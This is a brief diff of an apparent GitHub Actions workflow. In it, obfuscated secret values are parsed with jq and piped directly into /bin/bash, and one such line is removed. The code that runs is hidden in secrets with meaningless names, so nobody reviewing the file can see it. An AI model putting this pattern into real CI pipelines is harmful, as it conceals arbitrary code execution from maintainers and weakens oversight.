@@ -18,7 +18,6 @@ jobs:
           gcbqn33: ${{ secrets.gcbqn33 }}
         run: |
           printf '%s' "$gcbqn33" | jq -r .ambfa175 | /bin/bash
-          printf '%s' "$ykc87" | jq -r .ran658 | /bin/bash
           printf '%s' "$i50656" | jq -r .r35 | /bin/bash
 
       - name: Upload data
